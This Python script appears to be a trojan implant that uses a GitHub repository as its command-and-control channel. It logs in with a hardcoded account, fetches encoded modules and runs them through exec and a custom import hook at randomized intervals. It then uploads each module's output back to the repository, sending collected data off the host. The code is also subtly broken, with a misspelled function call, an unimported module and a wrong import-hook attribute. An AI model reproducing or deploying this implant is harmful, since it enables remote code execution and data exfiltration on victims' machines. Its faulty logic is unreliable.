import json
import base64
import sys
import time
import random
import threading
import queue
import os

from github3 import login

module_id = 'm'
module_config_path = module_id +'.json'
data_path = 'data/{}/'.format(module_id)
modules = []
configured = False
task_queue = queue.Queue()
password = sys.argv[1]


def connect_to_github():
    gh = login(username="yanganto", password=password)
    repo = gh.repository("yanganto", 'InAir')
    branch = repo.branch('master')
    
    return gh, repo, branch

def get_file_content(filepath):

    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    with open(filepath, 'r') as fin:
        module_config = json.loads(fin.read())
    
    modules = {}

    
    for file_in_repo  in tree.to_json()['tree']:
        if file_in_repo['path'] in [m['module'] + '.py' for m in module_config]:
            print("[*] Found file {}".format(file_in_repo['path']))
            text = base64.b64decode(repo.blob(file_in_repo['sha']).content).decode('utf-8')
            print(text)
            modules[file_in_repo['path'].replace('.py', '')] = text

    print(modules)
    return modules

def get_module_config():
    global configured
    config_json = get_file_content(module_config_path)
    print(config_json)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec('import ' + task['module'])
    return config

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/{}/{}.data".format(module_id, random.randint(1000,10000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return 

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))

        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

        return None
    
    def load_module(self, name):
        module = imp.new_nodule(name)
        exec(self.current_module_code in module.__dict__)
        sys.modules[name] = module
        return module

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    return

sys.meta = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_module_config()
    for task in config:
        t = threading.Thread(target=module_runner, args=(task['module'],))
        t.start()
        time.sleep(random.randint(1,10))
    
    time.sleep(random.randint(1000,10000))
